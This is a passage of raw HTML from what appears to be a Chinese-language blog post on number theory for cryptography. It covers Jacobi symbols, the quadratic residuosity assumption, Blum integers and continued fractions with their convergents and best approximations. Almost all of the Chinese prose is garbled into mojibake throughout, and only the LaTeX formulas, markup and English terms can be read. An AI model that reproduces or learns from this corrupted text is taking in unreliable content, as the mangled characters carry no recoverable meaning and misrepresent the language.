map)</h2><p>$J_n:Z_n^*\rightarrow{\pm1}$</p><p>$a\in Z_n^*\rightarrow (\frac{a}{n})=\pm1$</p><p>$é›…å¯æ¯”æ˜ å°„çš„æ ¸ï¼šKer\ J_nï¼šZ_n^*ä¸­æ˜ å°„åˆ°1çš„éƒ¨åˆ†å½¢æˆçš„ä¸€ä¸ªå­é›†$</p><h3 id="äºŒæ¬¡å‰©ä½™æ€§å‡è®¾-QRå‡è®¾-Quadratic-residuosity-assumption"><a href="#äºŒæ¬¡å‰©ä½™æ€§å‡è®¾-QRå‡è®¾-Quadratic-residuosity-assumption" class="headerlink" title="äºŒæ¬¡å‰©ä½™æ€§å‡è®¾(QRå‡è®¾,Quadratic residuosity assumption)"></a>äºŒæ¬¡å‰©ä½™æ€§å‡è®¾(QRå‡è®¾,Quadratic residuosity assumption)</h3><script type="math/tex; mode=display">è®¾n=pqï¼Œå…¶ä¸­på’Œqæ˜¯ä¸åŒçš„ç´ æ•°ï¼Œ\\åœ¨ä¸çŸ¥é“på’Œqçš„æƒ…å†µä¸‹ï¼Œ\\ç»™å®š\mathbb{Z_n^*}ä¸­çš„å…¶ä¸­ä¸€ä¸ªæ•´æ•°ï¼Œ(ä»\mathbb{Ker\ J_n}é‡Œéšæœºé€‰æ‹©ä¸€ä¸ªæ•´æ•°ï¼‰\\å°†éš¾ä»¥åˆ¤æ–­ä»–æ˜¯ä¸æ˜¯äºŒæ¬¡å‰©ä½™(éš¾ä»¥åŒºåˆ†äºŒæ¬¡å‰©ä½™å’ŒäºŒæ¬¡éå‰©ä½™,\\å³éš¾ä»¥åŒºåˆ†å®ƒå±äº\mathbb{(Z_n^*)^2}è¿˜æ˜¯\mathbb{Ker\ J_n\setminus (Z_n^*)^2}ã€‚</script><p>$(\frac{a}{n})=-1\Rightarrow aæ˜¯æ¨¡nä¸‹äºŒæ¬¡éå‰©ä½™$</p><p>$(\frac{a}{n})=1æ—¶,(\frac{a}{p})ã€(\frac{a}{q})å¯èƒ½åŒä¸º1æˆ–-1ï¼Œä»…å‰è€…æ‰æ˜¯äºŒæ¬¡å‰©ä½™$</p><hr><h2 id="åŠç´ æ•°ï¼ˆsemi-primeï¼‰"><a href="#åŠç´ æ•°ï¼ˆsemi-primeï¼‰" class="headerlink" title="åŠç´ æ•°ï¼ˆsemi-primeï¼‰"></a>åŠç´ æ•°ï¼ˆsemi-primeï¼‰</h2><p><strong>å®šä¹‰</strong>ï¼šåˆç§°â€œäºŒç´ æ•°â€ï¼ˆbiprimeï¼‰ï¼Œåˆ™$n$æ˜¯åŠç´ æ•°ï¼Œåˆ™$n=pq$ ,$p$å’Œ$q$<br>éƒ½æ˜¯$n$çš„ç´ å› å­ ($p$å’Œ$q$å¯ä»¥ç›¸åŒ)ã€‚æ¯”å¦‚ï¼š4,6,9,10,$\cdots$</p><p>Blumæ•´æ•°æ˜¯ä¸€ç§åŠç´ æ•°ğŸ‘‡</p><h3 id="Blumæ•´æ•°"><a href="#Blumæ•´æ•°" class="headerlink" title="Blumæ•´æ•°"></a>Blumæ•´æ•°</h3><p><strong>å®šä¹‰</strong>ï¼š$næ˜¯Blumæ•´æ•°ï¼Œåˆ™n=pqï¼Œp\equiv q\equiv 3\pmod 4$æ˜¯ä¸¤ä¸ªä¸åŒçš„ç´ å› å­ã€‚</p><p><strong>æ€§è´¨</strong>ï¼šè®¾næ˜¯Blumæ•´æ•°</p><ul><li><p>1.<script type="math/tex">(\frac{-1}{p})=(\frac{-1}{q})=-1\\(\frac{-1}{n})=(\frac{-1}{p})(\frac{-1}{q})=(-1)(-1)=1</script></p></li><li><p>2.<script type="math/tex">å¯¹äºä»»æ„  a \in Z_{n}^{*},\left(\frac{a}{n}\right)=1 \Rightarrow a \in\left(Z_{n}^{*}\right)^{2}  æˆ–  -a \in\left(Z_{n}^{*}\right)^{2}</script></p><blockquote><p>$\left(\frac{a}{n}\right)=\left(\frac{a}{p}\right)\left(\frac{a}{q}\right)=1 \Rightarrow\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=1  æˆ–  \left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=-1 $</p><p>$\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=1 \Rightarrow a \in\left(Z_{n}^{*}\right)^{2}æ—¶ï¼š$</p><script type="math/tex; mode=display">\left(\frac{-a}{p}\right)=\left(\frac{-1}{p}\right)\left(\frac{a}{p}\right)=-1 \times 1=-1 , åŒç†,  \left(\frac{-a}{q}\right)=-1 \Rightarrow-a \in Z_{n}^{*} \backslash\left(Z_{n}^{*}\right)^{2}</script><p>$\left(\frac{a}{p}\right)=\left(\frac{a}{q}\right)=-1æ—¶åŒç†å¯å¾—-a \in\left(Z_{n}^{*}\right)^{2}$</p></blockquote></li><li><p>3.å¯¹äºä»»æ„$a\in(Z_n^*)^2$,è®¾å®ƒçš„å››ä¸ªå¹³æ–¹æ ¹ä¸º$\pm b$å’Œ åœŸ$b^\prime$,åˆ™</p></li></ul><p>  $\left(\frac bp\right)=\left(\frac bq\right)=1$,å³$b\in(Z_n^*)^2$</p><p>  $\left(\frac{-b}p\right)=\left(\frac{-b}q\right)=-1$</p><p>  $\left(\frac{b^{\prime}}p\right)=1,\left(\frac{b^{\prime}}q\right)=-1$<br>  $\left(\frac{-b^{\prime}}p\right)=-1,\:\left(\frac{-b^{\prime}}q\right)=1$</p><ul><li><p>4.å‡½æ•°$f(x)=x^2mod$ $n$æ˜¯å®šä¹‰åœ¨$(Z_n^*)^2$ä¸Šçš„ç½®æ¢ã€‚</p><script type="math/tex; mode=display">x\in(Z_n^*)^2\Rightarrow f(x)=x^2\:mod\:n\in(Z_n^*)^2</script><script type="math/tex; mode=display">f(x)=y\in(Z_n^*)^2\Rightarrow$æœ‰å”¯ä¸€çš„å¹³æ–¹æ ¹ $x\in(Z_n^*)^2</script></li><li><p>5.è®¾$a\in(Z_n^*)^2$,é›…å¯æ¯”ç¬¦å·æ˜¯1çš„ä¸¤ä¸ªå¹³æ–¹æ ¹ä¸­åªæœ‰ä¸€ä¸ªå°äº$\frac n2$ (å¦ä¸€ä¸ªå¤§äº$\frac n2)$ã€‚</p><blockquote><p>æš—ç¤ºï¼šé›…å¯æ¯”ç¬¦å·æ˜¯ -1 çš„ä¸¤ä¸ªå¹³æ–¹æ ¹ä¸­åªæœ‰ä¸€ä¸ªçš„å€¼å°äº $\frac n2$ (å¦ä¸€ä¸ªå¤§äº$\frac n2)$<br>å–å€¼å°äº (å¤§äº)$\frac n2$çš„ä¸¤ä¸ªå¹³æ–¹æ ¹çš„é›…å¯æ¯”ç¬¦å·äº’ä¸ºç›¸åæ•°ã€‚</p></blockquote></li></ul><hr><h2 id="è¿åˆ†æ•°ï¼ˆContinued-Fractionï¼‰"><a href="#è¿åˆ†æ•°ï¼ˆContinued-Fractionï¼‰" class="headerlink" title="è¿åˆ†æ•°ï¼ˆContinued Fractionï¼‰"></a>è¿åˆ†æ•°ï¼ˆContinued Fractionï¼‰</h2><h3 id="ç®€å•è¿åˆ†æ•°-Simple-Continued-Fraction"><a href="#ç®€å•è¿åˆ†æ•°-Simple-Continued-Fraction" class="headerlink" title="ç®€å•è¿åˆ†æ•°(Simple Continued Fraction)"></a>ç®€å•è¿åˆ†æ•°(Simple Continued Fraction)</h3><p>$a_0+\frac1{a_1+\frac1{a_2+\frac1{a_3+\frac1{â€¦}}}}$<br>$a_0$å¯ä»¥æ˜¯ä»»æ„æ•´æ•°ï¼Œ$a_i$æ˜¯æ­£æ•´æ•°$(i&gt;0):$éƒ¨åˆ†å•† (partial quotient)<br>$[a_0,a_1,a_2,a_3,â€¦]$</p><blockquote><p>ä¾‹ï¼š$\frac{43}{19}= 2+\frac1{3+\frac1{1+\frac14}}=[2,3,1,4]=[2,[3,1,4]]=2+\frac{1}{[3,1,4]}$</p></blockquote><p>ä»»ä½•å®æ•°éƒ½å¯ä»¥ç”¨è¿åˆ†æ•°çš„å½¢å¼æ¥è¡¨ç¤º</p><p>$\mathbb{Q}={\frac ab\mid a,b\in\mathbb{Z},b\neq0}$</p><h4 id="æœ‰é™è¿åˆ†æ•°-Finite-Continued-Fraction"><a href="#æœ‰é™è¿åˆ†æ•°-Finite-Continued-Fraction" class="headerlink" title="æœ‰é™è¿åˆ†æ•°(Finite Continued Fraction)"></a>æœ‰é™è¿åˆ†æ•°(Finite Continued Fraction)</h4><p>$[a_0,a_1,\dots,a_n]$</p><p><strong>å®šç†</strong>ï¼šä»»ä½•æœ‰ç†æ•°éƒ½å¯ä»¥è¡¨ç¤ºæˆæœ‰é™è¿åˆ†æ•°ï¼›ä»»ä½•<br>æœ‰é™è¿åˆ†æ•°éƒ½æ˜¯ä¸€ä¸ªæœ‰ç†æ•°ã€‚<br>$\frac ab\ \underleftrightarrow{æ¬§å‡ é‡Œå¾—ç®—æ³•}\ [a_0,a_1,â€¦,a_n]$</p><p>$[a_0,a_1,\dots,a_n]=[a_0,a_1,\dots,a_m,[a_{m+1}\dots,a_n]]$</p><p><strong>æœ‰é™è¿åˆ†æ•°è¡¨ç¤ºå€’æ•°</strong></p><p>ç»™å®šæœ‰é™è¿åˆ†æ•°$[a_0,a_1,â€¦,a_n]$,æ±‚å€’æ•°</p><ul><li>å¦‚æœ$a_0=0$,å°±æŠŠ0å»æ‰ï¼š$[a_1,â€¦,a_n]$</li><li>å¦‚æœ$a_0\neq0$,å°±åœ¨å‰é¢è¡¥ä¸Š$0:[0,a_0,â€¦,a_n]$</li></ul><h5 id="æœ‰é™è¿åˆ†æ•°çš„ç­‰ä»·è¡¨ç¤º"><a href="#æœ‰é™è¿åˆ†æ•°çš„ç­‰ä»·è¡¨ç¤º" class="headerlink" title="æœ‰é™è¿åˆ†æ•°çš„ç­‰ä»·è¡¨ç¤º"></a>æœ‰é™è¿åˆ†æ•°çš„ç­‰ä»·è¡¨ç¤º</h5><p> $n&gt; 0$,$a_n=1$æ—¶ï¼Œ$[a_0,a_1,â€¦,1]=[a_0,a_1,â€¦,a_{n-1}+1]$<br>å¦åˆ™ï¼Œ$[a_0,a_1,â€¦,a_n]=[a_0,a_1,â€¦,a_n-1,1]$</p><h5 id="å”¯ä¸€æ€§è¡¨è¾¾"><a href="#å”¯ä¸€æ€§è¡¨è¾¾" class="headerlink" title="å”¯ä¸€æ€§è¡¨è¾¾"></a>å”¯ä¸€æ€§è¡¨è¾¾</h5><p><strong>å®šç†</strong>ï¼šå¦‚æœä¸¤ä¸ªæœ‰é™è¿åˆ†æ•°$[a_0,â€¦,a_n],[b_0,â€¦,b_m]$éƒ½ç­‰äºæœ‰ç†æ•°$x$,å¹¶ä¸”$a_n&gt;1,b_m&gt;1$,é‚£ä¹ˆ$n=m$,è€Œä¸”å®ƒä¿©æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚</p><h4 id="æ— é™è¿åˆ†æ•°-Infinite-Continued-Fraction"><a href="#æ— é™è¿åˆ†æ•°-Infinite-Continued-Fraction" class="headerlink" title="æ— é™è¿åˆ†æ•°(Infinite Continued Fraction)"></a>æ— é™è¿åˆ†æ•°(Infinite Continued Fraction)</h4><p>$[a_0,a_1,\dots]$</p><p>è¡¨ç¤ºæ— ç†æ•°</p><p><strong>å®šç†1ï¼š</strong>å¯¹äºæ— é™è¿åˆ†æ•°$[ a_0, a_1, . . . ]$,     $x_n= [ a_0, a_1, . . . , a_n]$æ˜¯ç¬¬nä¸ªæ¸è¿›åˆ†æ•°ã€‚å¦‚æœ$n\to\infty$,åˆ™$x_n\to x$ , $x\in R$ ã€‚<br>$x=[a_0,a_1,\dots]$</p><p><strong>æ¸è¿›åˆ†æ•°çš„åˆ†æ¯æ»¡è¶³ä»¥ä¸‹æ€§è´¨</strong>ï¼š<br>ç¬¬nä¸ªæ¸è¿›åˆ†æ•°$[a_0,a_1,â€¦,a_n]=x_n=\frac{p_n}{q_n}$ ,<br>åˆ™ $q_n\geq n$ã€‚å¦‚æœ$n&gt;3$,åˆ™ $q_n&gt;n$ã€‚(è¯æ˜ç•¥)</p><p><strong>æ€§è´¨</strong>ï¼š</p><ul><li>ä»»ä½•æ— é™è¿åˆ†æ•°éƒ½å°äºå®ƒçš„ä»»æ„å¥‡æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°ï¼Œè€Œå¤§äºä»»æ„å¶æ•°ç¼–å·çš„ã€‚(ä¸‰æ˜æ²»ç»“æ„)</li><li>$a_t$æ˜¯ç¬¬$t$ä¸ªå®Œå…¨å•†çš„æ•´æ•°éƒ¨åˆ†ã€‚ç‰¹åˆ«çš„ï¼Œ$a_0$æ˜¯æ— é™è¿åˆ†æ•°çš„æ•´æ•°éƒ¨åˆ†ã€‚</li><li>ä¸¤ä¸ªæ— é™è¿åˆ†æ•°ï¼Œå¦‚æœå®ƒä»¬è¡¨ç¤ºçš„å®æ•°ç›¸åŒã€å®ƒä¿©å°±æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚</li><li>ä»»ä½•æ— ç†æ•°è¡¨ç¤ºæˆæ— é™è¿åˆ†æ•°æ—¶ï¼Œå…¶è¡¨ç¤ºå½¢å¼æ˜¯å”¯ä¸€çš„ã€‚</li></ul><h3 id="æ¸è¿›åˆ†æ•°"><a href="#æ¸è¿›åˆ†æ•°" class="headerlink" title="æ¸è¿›åˆ†æ•°"></a>æ¸è¿›åˆ†æ•°</h3><p><strong>å®šä¹‰</strong>ï¼š$\begin{aligned}\text{ç§° }&amp;[a_0,â€¦,a_m]\left(0\leq m\leq n\right)\text{ä¸º }[a_0,a_1,â€¦,a_n]\text{çš„ç¬¬mä¸ªæ¸è¿›åˆ†æ•°ã€‚}\end{aligned}$</p><p>æ™®éè§„å¾‹ï¼šåŸæœ¬çš„åˆ†æ•°å±…ä¸­ï¼Œå¶æ•°ç¼–å·ä½äºå·¦è¾¹ï¼Œå‘ˆé€’å¢è¶‹åŠ¿ï¼Œå¥‡æ•°ç¼–å·ä½äºå³è¾¹ï¼Œå‘ˆé€’å‡è¶‹åŠ¿ï¼Œä»ä¸¤è¾¹é€æ¸é€¼è¿‘ã€‚</p><p>$[a_0]=\frac{p_0}{q_0}$<br>$[a_0,a_1]=\frac{p_1}{q_1}$<br>$[a_0,a_1,â€¦,a_n]=\frac{p_n}{q_n}$<br>$\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdots&lt;\frac{p_n}{q_n}&lt;\cdots&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1} $</p><p><strong>è¿­ä»£å…¬å¼</strong></p><p>å†™æˆ$[a_0,â€¦,a_m]=\frac{p_n}{q_n}$<br>åˆ™æœ‰$p_n=a_np_{n-1}+p_{n-2},\quad q_n=a_nq_{n-1}+q_{n-2}\quad(n\geq2)$</p><p><img src="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/æ¸è¿›åˆ†æ•°.jpg" alt="æ¸è¿›åˆ†æ•°"></p><h4 id="å®šç†"><a href="#å®šç†" class="headerlink" title="å®šç†"></a>å®šç†</h4><p>$p_n q_{n-1}-p_{n-1} q_n=(-1)^{n-1}$</p><h3 id="å®Œå…¨å•†-Complete-quotient"><a href="#å®Œå…¨å•†-Complete-quotient" class="headerlink" title="å®Œå…¨å•†(Complete quotient)"></a>å®Œå…¨å•†(Complete quotient)</h3><p><strong>å®šä¹‰</strong>ï¼šç§°<script type="math/tex">[a_t,\dots,a_n](0â‰¤t\leq n)ä¸º[a_0,a_1,...,a_n]çš„ç¬¬tä¸ªå®Œå…¨å•†</script></p><p><strong>å®šç†</strong>ï¼š$\text{å®šç†:ç»™å®šæœ‰é™è¿åˆ†æ•° }[a_0,a_1,â€¦,a_n]\text{,æœ‰}$</p><p>$\bullet\text{ å¦‚æœ }a_n=1\text{,åˆ™ }[a_{n-1},a_n]\text{ çš„æ•´æ•°éƒ¨åˆ†æ˜¯ }a_{n-1}+1$</p><p>$\bullet\text{ å¦åˆ™ }[a_t,â€¦,a_n]\text{ (0}\leq t\leq n)\text{ çš„æ•´æ•°éƒ¨åˆ†æ˜¯ }a_t$</p><h3 id="å•è°ƒæ€§ï¼ˆmonotone-propertiesï¼‰"><a href="#å•è°ƒæ€§ï¼ˆmonotone-propertiesï¼‰" class="headerlink" title="å•è°ƒæ€§ï¼ˆmonotone propertiesï¼‰"></a>å•è°ƒæ€§ï¼ˆmonotone propertiesï¼‰</h3><ul><li><p>æ€§è´¨1ï¼šæ‰€æœ‰å¶æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°æ˜¯ä¸¥æ ¼é€’å¢çš„($\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdotp\cdotp\cdotp)$,è€Œå¥‡æ•°ç¼–å·çš„åˆ™æ˜¯ä¸¥æ ¼é€’å‡çš„($â€¦&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1}).$</p></li><li><p>æ€§è´¨2ï¼šä»»ä½•å¥‡æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°å¤§äºå’Œå®ƒç›¸é‚»çš„ä¸¤ä¸ªå¶æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°ã€‚</p></li><li><p>æ€§è´¨3ï¼š$\frac{p_0}{q_0}&lt;\frac{p_2}{q_2}&lt;\cdots&lt;\frac{p_n}{q_n}&lt;\cdots&lt;\frac{p_3}{q_3}&lt;\frac{p_1}{q_1} $</p><blockquote><p>å¦‚æœ$n$æ˜¯å¶æ•°ï¼Œåˆ™$x_n$æ˜¯å¶æ•°ç¼–å·é‡Œæœ€å¤§çš„æ¸è¿›åˆ†æ•°ï¼Œ<br>ä¸” $x_n$å°äºæ‰€æœ‰å¥‡æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°ã€‚</p><p>å¦‚æœ$n$æ˜¯å¥‡æ•°ï¼Œåˆ™$x_n$æ˜¯å¥‡æ•°ç¼–å·é‡Œæœ€å°çš„æ¸è¿›åˆ†æ•°ï¼Œ</p><p>ä¸” $x_n$å¤§äºæ‰€æœ‰å¶æ•°ç¼–å·çš„æ¸è¿›åˆ†æ•°ã€‚</p></blockquote></li></ul><h3 id="è¿åˆ†æ•°ç®—æ³•-continued-fraction-algorithm"><a href="#è¿åˆ†æ•°ç®—æ³•-continued-fraction-algorithm" class="headerlink" title="è¿åˆ†æ•°ç®—æ³• (continued fraction algorithm)"></a>è¿åˆ†æ•°ç®—æ³• (continued fraction algorithm)</h3><p>æ¬§å‡ é‡Œå¾—ç®—æ³•åªèƒ½å¤„ç†åˆ†æ•°ï¼Œä¸èƒ½å¤„ç†å°æ•°</p><p>è¾“å…¥ï¼šå®æ•°$x$</p><p>ä»¤$i=0,x_0=x;$</p><ul><li>step1.    ä»¤$a_i$ä¸º $x_i$çš„æ•´æ•°éƒ¨åˆ†ï¼›</li><li>step2.     $b_i=x_i-a_i$</li><li>step3.    $ if\ b_i\neq0$, then $i++,x_i=1/_{b_i}$,$è½¬å»step1$;</li><li>else return $[a_0,a_1,â€¦]$ ;</li></ul><h3 id="å‘¨æœŸè¿åˆ†æ•°-periodic-continued-fraction"><a href="#å‘¨æœŸè¿åˆ†æ•°-periodic-continued-fraction" class="headerlink" title="å‘¨æœŸè¿åˆ†æ•°(periodic continued fraction)"></a>å‘¨æœŸè¿åˆ†æ•°(periodic continued fraction)</h3><p><strong>å®šä¹‰</strong>ï¼šå‘¨æœŸè¿åˆ†æ•°$[a_0,a_1,â€¦]$æ˜¯æ— é™è¿åˆ†æ•°ï¼Œè€Œä¸”å¯¹äºå›ºå®šçš„æ­£æ•´æ•°$k$,ä»¥åŠæ‰€æœ‰çš„$l\geq L$,<br>éƒ½æœ‰$a_l=a_{l+k}$ ,<br>éƒ¨åˆ†å•†$a_L,â€¦,a_{L+k-1}$ç§°ä½œ <strong>å‘¨æœŸ(period)</strong>ã€‚</p><p>å¯ç®€å†™æˆ$\left[a_0,â€¦,a_{L-1},\overline{a_L,â€¦,a_{L+k-1}}\right]$ã€‚</p><blockquote><p>ä¾‹ï¼š$\begin{aligned}&amp;[2,5,1,4,3,6,1,4,3,6,â€¦]\&amp;=[2,5,\overline{1,4,3,6}]\end{aligned}$</p></blockquote><p>ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹</p><script type="math/tex; mode=display">ax^2+bx+c=0\quad(a,b,c\in\mathbb{Z},\:a\neq0)</script><p>äºŒæ¬¡ä¸å°½æ ¹$: u\pm \sqrt {w}$ $( u, w\in Q)$ ,$\sqrt{w}$ æ˜¯æ— ç†æ•° ($w$ä¸èƒ½å®Œå…¨å¼€æ–¹ï¼‰</p><ul><li><strong>å®šç†(æ¬§æ‹‰)</strong>:å¦‚æœtæ˜¯å‘¨æœŸè¿åˆ†æ•°ï¼Œå®ƒå°±ä¸€å®šæ˜¯äºŒæ¬¡ä¸å°½æ ¹</li><li><strong>å®šç†(æ‹‰æ ¼æœ—æ—¥)</strong>:å¦‚æœtæ˜¯äºŒæ¬¡ä¸å°½æ ¹ï¼Œå®ƒå°±ä¸€å®šæ˜¯å‘¨æœŸè¿åˆ†æ•°</li></ul><blockquote><script type="math/tex; mode=display">\begin{aligned}x^2-2x-1&=0\\x^{2}&=2x+1\\x&=2+\frac1x\\&=2+\frac1{2+\frac1x}\\&=2+\frac{1}{2+{\frac{1}{\dots}}}=[2,2,\dots]=1+\sqrt{2}(ç™½é“¶æ¯”ä¾‹)\end{aligned}</script><script type="math/tex; mode=display">\begin{aligned}x^2-x-1&=0\\x^{2}&=x+1\\x&=1+\frac1x\\&=1+\frac1{1+\frac1x}\\&=1+\frac{1}{1+{\frac{1}{\dots}}}=[1,1,\dots]=\frac{1+\sqrt{5}}2(é»„é‡‘æ¯”ä¾‹)\end{aligned}</script></blockquote><h4 id="å‘¨æœŸè¿åˆ†æ•°ä¸æ•°åˆ—"><a href="#å‘¨æœŸè¿åˆ†æ•°ä¸æ•°åˆ—" class="headerlink" title="å‘¨æœŸè¿åˆ†æ•°ä¸æ•°åˆ—"></a>å‘¨æœŸè¿åˆ†æ•°ä¸æ•°åˆ—</h4><h5 id="æ–æ³¢é‚£å¥‘æ•°åˆ—-1-1-2-3-5-8-13-dots"><a href="#æ–æ³¢é‚£å¥‘æ•°åˆ—-1-1-2-3-5-8-13-dots" class="headerlink" title="æ–æ³¢é‚£å¥‘æ•°åˆ— $1,1,2,3,5,8,13,\dots$"></a><strong>æ–æ³¢é‚£å¥‘æ•°åˆ—</strong> $1,1,2,3,5,8,13,\dots$</h5><p>$F_0=1,\quad F_1=1,$<br>$F_n=F_{n-1}+F_{n-2}=\frac{\phi^n-(-\phi)^{-n}}{\sqrt{5}}\quad(\phi=\frac{1+\sqrt{5}}2)$</p><ul><li><strong>é»„é‡‘æ¯”ä¾‹çš„å‘¨æœŸè¿åˆ†æ•°çš„å„ä¸ªæ¸è¿›åˆ†æ•°æ°å¥½æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—ç›¸é‚»ä¸¤é¡¹ç›¸é™¤æ‰€å¾—çš„åˆ†æ•°</strong></li></ul><h5 id="ä½©å°”æ•°åˆ—-0-1-2-5-12-29-70-dots"><a href="#ä½©å°”æ•°åˆ—-0-1-2-5-12-29-70-dots" class="headerlink" title="ä½©å°”æ•°åˆ— $0,1,2,5,12,29,70,\dots$"></a><strong>ä½©å°”æ•°åˆ—</strong> $0,1,2,5,12,29,70,\dots$</h5><p>$P_0=0,P_1=1,$</p><p>$P_n=2P_{n-1}+P_{n-2}=\frac{(1+\sqrt{2})^n-(1-\sqrt{2})^n}{2\sqrt{2}}$</p><ul><li><strong>ç™½é“¶æ¯”ä¾‹çš„å‘¨æœŸè¿åˆ†æ•°çš„å„ä¸ªæ¸è¿›åˆ†æ•°æ°å¥½æ˜¯ä½©å°”æ•°åˆ—ç›¸é‚»ä¸¤é¡¹ç›¸é™¤æ‰€å¾—çš„åˆ†æ•°</strong></li></ul><h3 id="æœ€ä½³è¿‘ä¼¼å€¼-amp-ä¸¢ç•ªå›¾é€¼è¿‘-Diophantine-approximation"><a href="#æœ€ä½³è¿‘ä¼¼å€¼-amp-ä¸¢ç•ªå›¾é€¼è¿‘-Diophantine-approximation" class="headerlink" title="æœ€ä½³è¿‘ä¼¼å€¼&amp;ä¸¢ç•ªå›¾é€¼è¿‘(Diophantine approximation)"></a>æœ€ä½³è¿‘ä¼¼å€¼&amp;ä¸¢ç•ªå›¾é€¼è¿‘(Diophantine approximation)</h3><p><strong>æœ€ä½³è¿‘ä¼¼å€¼å®šä¹‰</strong>ï¼šåœ¨æ•°è½´ä¸Šï¼Œå¦‚æœä¸å…¶ä»–æœ‰ç†æ•°ç›¸æ¯”ï¼Œ$\frac pq$ ($p$å’Œ$q$ æ²¡æœ‰å…¬å› å­)åˆ°å®æ•°$x$ çš„è·ç¦»æ›´è¿‘ï¼Œé‚£ä¹ˆ$\frac pq$å°±å«ä½œ$x$ çš„æœ€ä½³è¿‘ä¼¼å€¼(<strong>åªè€ƒè™‘åˆ†æ¯å¤§å°ä¸è¶…è¿‡qçš„æœ‰ç†æ•°</strong>)</p><p><strong>å®šç†</strong>ï¼š$\text{è®¾ }x=[a_0,a_1,â€¦]\text{,åœ¨åˆ†æ¯ä¸è¶…è¿‡ }q_t\text{ çš„æœ‰ç†æ•°ä¸­,}\\text{ç¬¬}t\text{ä¸ªæ¸è¿›åˆ†æ•° }\frac{p_t}{q_t}\text{ æ˜¯ å®æ•° }x\text{ çš„æœ€ä½³è¿‘ä¼¼å€¼ã€‚}$(è¯æ˜ç•¥)</p><p><strong>ä¸€ä¸ªå®æ•°æ‰€æœ‰çš„æ¸è¿›åˆ†æ•°éƒ½æ˜¯ä»–çš„æœ€ä½³è¿‘ä¼¼å€¼</strong>(åˆ†æ¯ä¸è¶…è¿‡æ¸è¿›åˆ†æ•°çš„åˆ†æ¯çš„å…¨éƒ¨æœ‰ç†æ•°èŒƒå›´å†…)</p><p><strong>å®æ•°çš„æœ€ä½³è¿‘ä¼¼å€¼ä¸åªæœ‰å®ƒçš„æ¸è¿›åˆ†æ•°</strong></p><h4 id="åŠæ¸è¿›åˆ†æ•°-semi-convergent-æ¬¡æ¸è¿›åˆ†æ•°-secondary-convergent"><a href="#åŠæ¸è¿›åˆ†æ•°-semi-convergent-æ¬¡æ¸è¿›åˆ†æ•°-secondary-convergent" class="headerlink" title="åŠæ¸è¿›åˆ†æ•°(semi-convergent)(æ¬¡æ¸è¿›åˆ†æ•°(secondary convergent))"></a>åŠæ¸è¿›åˆ†æ•°(semi-convergent)(æ¬¡æ¸è¿›åˆ†æ•°(secondary convergent))</h4><p><strong>å®šä¹‰</strong>ï¼šè®¾ $x=[a_0,a_1,â€¦],\frac{p_t}{q_t}$ å’Œ$\frac{p_{t+1}}{q_{t+1}}$æ˜¯xçš„ä¸¤ä¸ªç›¸é‚»çš„æ¸è¿›åˆ†æ•°ï¼Œåˆ™<br>$\frac{p_t\:+\:r\:p_{t+1}}{q_t\:+\:r\:q_{t+1}}\quad(r\in\mathbb{Z},\:0\leq r\leq a_t)$,ç§°ä½œ$x$çš„åŠæ¸è¿›åˆ†æ•°ã€‚</p><ul><li><p><strong>æ¸ è¿› åˆ† æ•° ä¹Ÿ æ˜¯ åŠ æ¸ è¿› åˆ† æ•°</strong></p></li><li><p><strong>å®æ•°çš„æœ€ä½³è¿‘ä¼¼å€¼åªå­˜åœ¨äºåŠæ¸è¿›åˆ†æ•°é‡Œç¬¬tä¸ªå’Œç¬¬t+2ä¸ªæ¸è¿›åˆ†æ•°ä¹‹é—´ï¼Œå¤§çº¦æœ‰ä¸€åŠçš„â€œåŠæ¸è¿›åˆ†æ•°â€æ˜¯æœ€ä½³è¿‘ä¼¼å€¼</strong></p></li><li><p><strong>$a^t$å¯ä»¥ç”¨æ¥åº¦é‡â€œé€¼è¿‘â€çš„ç¨‹åº¦ï¼Œè¡¨ç¤ºæ¸è¿›åˆ†æ•°ç¦»å®æ•°ç©¶ç«Ÿæœ‰å¤šè¿‘ã€‚<br>$a^t$è¶Šå¤§ï¼Œæ¸è¿›åˆ†æ•°å°±æ›´é€¼è¿‘å®æ•°ã€‚</strong></p></li></ul><h3 id="è¿åˆ†æ•°çš„ç›¸åæ•°"><a href="#è¿åˆ†æ•°çš„ç›¸åæ•°" class="headerlink" title="è¿åˆ†æ•°çš„ç›¸åæ•°"></a>è¿åˆ†æ•°çš„ç›¸åæ•°</h3><p>ç®€å•è¿åˆ†æ•°ä¸­ï¼Œåªæœ‰$a_0$å¯ä¸ºéæ­£æ•´æ•°(0,$\pm$)</p><h4 id="ç®€å•è¿åˆ†æ•°è¡¨ç¤ºè´Ÿæ•°"><a href="#ç®€å•è¿åˆ†æ•°è¡¨ç¤ºè´Ÿæ•°" class="headerlink" title="ç®€å•è¿åˆ†æ•°è¡¨ç¤ºè´Ÿæ•°"></a>ç®€å•è¿åˆ†æ•°è¡¨ç¤ºè´Ÿæ•°</h4><p><strong>ç»™å®æ•°</strong></p><script type="math/tex; mode=display">x=-X-F(0<F<1)\\=(-X-1)+(1-F)\\=[a_0-X-1,a_1,...]</script><p>$1-F=[a_0,a_1,â€¦]$</p><p><strong>ç»™ç®€å•è¿åˆ†æ•°</strong></p><p>$x=[a_0,a_1,a_2,â€¦]$</p><p>$-x=[-a_0-1,1,a_1-1,a_2,â€¦]$</p><blockquote><p>PS:<script type="math/tex">è‹¥ä¸­é—´å‡ºç°0ï¼Œ[...,a_{t-1},a_t,0,a_{t+1},a_{t+2},...],åˆ™-x=[...,a_{t-1},a_t+a_{t+1},a_{t+2},...]</script></p><script type="math/tex; 